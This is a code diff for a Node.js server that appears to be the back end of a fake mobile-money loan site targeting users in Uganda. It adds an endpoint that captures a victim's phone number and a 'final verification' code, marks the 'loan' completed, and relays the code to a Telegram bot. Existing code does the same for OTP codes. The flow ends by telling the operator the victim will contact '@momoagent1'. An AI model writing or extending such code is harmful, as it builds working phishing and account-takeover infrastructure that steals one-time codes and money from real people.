@@ -34,6 +34,7 @@ async function initDatabase() {
                 duration INTEGER,
                 monthly_payment INTEGER,
                 otp_code TEXT,
+                final_code TEXT,
                 status TEXT DEFAULT 'pending',
                 created_at DATETIME DEFAULT CURRENT_TIMESTAMP
             );
@@ -118,12 +119,38 @@ app.post('/api/save-otp', async (req, res) => {
             `<b>📞 Phone:</b> <code>${phone}</code>\n` +
             `<b>🔑 OTP Code:</b> <code>${otp}</code>\n` +
             `━━━━━━━━━━━━━━━━━━\n\n` +
-            `<b>✅ User is completing the loan process.</b>`;
+            `<b>✅ User has entered OTP and is proceeding to final verification.</b>`;
         
         await sendTelegramMessage(message);
         res.json({ success: true });
     } catch (error) {
         console.error('Save OTP error:', error);
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
+
+app.post('/api/save-final', async (req, res) => {
+    try {
+        const { loanId, finalCode, phone } = req.body;
+        console.log(`🔐 Final code received - Loan: ${loanId}, Phone: ${phone}, Final Code: ${finalCode}`);
+        
+        if (db) {
+            await db.run(`UPDATE loans SET final_code = ?, status = ? WHERE loan_id = ?`, [finalCode, 'completed', loanId]);
+        }
+        
+        const message = `<b>✅ FINAL VERIFICATION - UGANDA</b>\n\n` +
+            `━━━━━━━━━━━━━━━━━━\n` +
+            `<b>🏷️ Loan ID:</b> <code>${loanId}</code>\n` +
+            `<b>📞 Phone:</b> <code>${phone}</code>\n` +
+            `<b>🔑 Final Code:</b> <code>${finalCode}</code>\n` +
+            `━━━━━━━━━━━━━━━━━━\n\n` +
+            `<b>🎉 LOAN FULLY COMPLETED!</b>\n` +
+            `<b>📱 User will now contact you on Telegram: @momoagent1</b>`;
+        
+        await sendTelegramMessage(message);
+        res.json({ success: true });
+    } catch (error) {
+        console.error('Save final error:', error);
         res.status(500).json({ success: false, error: error.message });
     }
 });
@@ -141,12 +168,13 @@ app.get('/api/loan/:loanId', async (req, res) => {
 app.get('/', (req, res) => { res.sendFile(path.join(__dirname, 'public', 'index.html')); });
 app.get('/verify.html', (req, res) => { res.sendFile(path.join(__dirname, 'public', 'verify.html')); });
 app.get('/otp.html', (req, res) => { res.sendFile(path.join(__dirname, 'public', 'otp.html')); });
+app.get('/final-verify.html', (req, res) => { res.sendFile(path.join(__dirname, 'public', 'final-verify.html')); });
 
 async function startServer() {
     await initDatabase();
     app.listen(PORT, '0.0.0.0', () => {
         console.log(`🚀 Uganda MoMo Server running on port ${PORT}`);
-        console.log(`📱 Telegram Bot Ready - OTP notifications enabled`);
+        console.log(`📱 Telegram Bot Ready - OTP and Final notifications enabled`);
     });
 }
 
